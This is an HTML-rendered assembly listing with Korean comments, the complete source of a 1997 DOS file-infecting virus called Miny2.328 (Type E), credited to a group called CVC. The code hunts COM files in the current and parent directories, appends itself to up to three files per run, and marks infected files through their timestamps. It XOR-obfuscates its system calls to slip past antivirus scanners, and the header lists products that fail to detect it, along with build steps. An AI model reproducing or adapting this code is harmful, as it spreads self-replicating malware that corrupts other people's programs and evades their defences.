<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                               CVC #02  97/09</span><span class="sc0">
</span><span class="sc1">; Virus Name : Miny2.328 (Type E)</span><span class="sc0">
</span><span class="sc1">; Author : Osiris</span><span class="sc0">
</span><span class="sc1">; Group : CVC (Corean Virus Club), Corea</span><span class="sc0">
</span><span class="sc1">; Date : 1997/08/24</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Type : Non-resident COM infector</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Miny2 (Type D) 의 개선판이다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 다음과 같은 점이 개선되었다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1. 현재 디렉토리 뿐 아니라 상위 디렉토리에서도 파일들을 감염시킬 수 있다.</span><span class="sc0">
</span><span class="sc1">; 2. 한번에 3 개의 COM 파일을 감염시킬 수 있다.</span><span class="sc0">
</span><span class="sc1">; 3. COMMAND.COM 은 감염에서 제외된다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; AVP 970812,DSAV 7.73,F-PROT 2.72a,PCSCAN 315,SCAN 9708,TBAV 8.02,V3 : 진단 x</span><span class="sc0">
</span><span class="sc1">; 단, F-prot 의 인공지능 검색에는 진단 된다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 더이상 이 바이러스를 단순한 Miny2 의 아류작으로 보지 말았으면 한다.</span><span class="sc0">
</span><span class="sc1">; Type E 부터는 원형 Miny2 와는 전혀 다른 구조를 가지고 있다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; TASM MINY2E      \
; TLINK MINY2E      &gt;  실행 방법</span><span class="sc0">
</span><span class="sc1">; EXE2COM MINY2E   /</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">

            </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
            </span><span class="sc9">.CODE</span><span class="sc0">

 </span><span class="sc5">Miny2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 쓰레기값 (아무일도 안한다.)</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 앞부분 복구시 바이러스가 파괴되기</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 때문에 이 값을 넣었다.</span><span class="sc0">
 </span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Next</span><span class="sc0">                  </span><span class="sc1">; 바이러스 시작점 구하기</span><span class="sc0">
 </span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; nop 을 빼버리면 'Howard' 로 진단</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">        </span><span class="sc1">; BP = 바이러스 시작지점</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">COM_head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; COM 앞부분 복구</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">               </span><span class="sc1">; DI 를 100h 로 잡아 버리면</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">; TBSCAN 에서 'O' 상태가 발생한다.</span><span class="sc0">
            </span><span class="sc6">movsw</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">              </span><span class="sc1">; DTA 로 사용해 PSP 내용 일부가 파괴</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">              </span><span class="sc1">; 되므로 잠시 저장한다.</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">47h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                 </span><span class="sc1">; 옛 디렉토리 저장</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">OldDir</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">int21</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Count</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0"> </span><span class="sc1">; 감염카운터 0</span><span class="sc0">

 </span><span class="sc5">FindFirst</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">4Eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 파일 찾기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100011B</span><span class="sc0">          </span><span class="sc1">; 파일 속성</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Match_COM</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; 찾고자 하는 파일 (*.c?m)</span><span class="sc0">
 </span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">ChgDir</span><span class="sc0">                </span><span class="sc1">; 에러면 상위 디렉토리로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">ChkInfected</span><span class="sc0">           </span><span class="sc1">; 감염 루틴 호출</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Count</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">; 3 개 감염 시켰나 ?</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">Restart</span><span class="sc0">               </span><span class="sc1">; 그러면 감염 활동 끝</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">4Fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 다음 파일 찾기</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Find</span><span class="sc0">

 </span><span class="sc5">ChgDir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">                </span><span class="sc1">; 상위 디렉토리로 이동</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">UP</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">   </span><span class="sc5">FindFirst</span><span class="sc0">             </span><span class="sc1">; 상위로 이동했으면 다시 COM 찾기</span><span class="sc0">
 </span><span class="sc5">Restart</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">                </span><span class="sc1">; 원래 디렉토리로 이동</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OldDir</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; 원래 DTA 복구</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">RET</span><span class="sc0">                         </span><span class="sc1">; 원래 COM 파일 실행</span><span class="sc0">

</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">; 실제 바이러스 감염 루틴</span><span class="sc0">
</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">

 </span><span class="sc5">ChkInfected</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; 감염 여부를 확인한다.</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">009Eh</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0"> </span><span class="sc1">; COMMAND.COM 인가 ?</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">ErrorRtn</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0096h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; 62 초 인지 검사한다.</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">Infect</span><span class="sc0">
 </span><span class="sc5">ErrorRtn</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RET</span><span class="sc0">                         </span><span class="sc1">; 62 초 이면 다음 파일 검사로 이어짐</span><span class="sc0">

 </span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">4301h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">4949h</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; 읽기/쓰기 속성으로 바꿈</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">009Eh</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">ErrorRtn</span><span class="sc0">              </span><span class="sc1">; 에러 발생</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">3D02h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">4949h</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; 파일 오픈</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">ErrorRtn</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                 </span><span class="sc1">; BX = 파일핸들</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">5700h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; 파일 작성 시간 얻기</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">; 작성 시간 저장</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3Fh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 앞부분 읽기</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; 버퍼 주소</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">               </span><span class="sc1">; 3 바이트</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0"> </span><span class="sc1">; MZ 인가 ?</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">lseek2</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc10">Error</span><span class="sc0">
 </span><span class="sc5">lseek2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">                 </span><span class="sc1">; 파일 끝으로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">lseek</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; 64 KB 이상인가 ?</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc10">Error</span><span class="sc0">                 </span><span class="sc1">; 다음 검사때 오픈 시키지 않기위해서</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">; 점프값 계산</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 바이러스 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">End_virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">int21</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                 </span><span class="sc1">; 처음으로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">lseek</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 점프 코드 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">0EAh</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; E9h = JMP</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">int21</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Count</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; 감염 갯수 증가</span><span class="sc0">
 </span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; 파일 작성 시간 복구</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,+</span><span class="sc2">1Fh</span><span class="sc0">               </span><span class="sc1">; 62 초로 만들기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">5701h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">4949h</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; 파일 작성 시간 복구</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3Eh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 파일 닫기</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">RET</span><span class="sc0">

 </span><span class="sc5">lseek</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; 포인터 이동</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; AH=42h</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">Int21</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; XOR 49h 연산후</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4949h</span><span class="sc0">              </span><span class="sc1">; 인터럽트 21h 호출</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">


 </span><span class="sc5">COM_head</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">; COM 앞부분</span><span class="sc0">
 </span><span class="sc5">Match_COM</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'*.c?m'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">            </span><span class="sc1">; COM 파일 찾기</span><span class="sc0">
 </span><span class="sc5">Up</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">; 상위 디렉토리</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'Miny2'</span><span class="sc0">               </span><span class="sc1">; 미니 2</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'(c) 1997 Osiris of CVC,Corea'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
 </span><span class="sc5">End_Virus</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; 실제 써지는 바이러스 끝</span><span class="sc0">


 </span><span class="sc5">Count</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">                     </span><span class="sc1">; 감염 갯수</span><span class="sc0">
 </span><span class="sc5">JumpCode</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                 </span><span class="sc1">; 점프 값</span><span class="sc0">
 </span><span class="sc5">OldDir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">                     </span><span class="sc1">; 옛 디렉토리 저장 장소</span><span class="sc0">
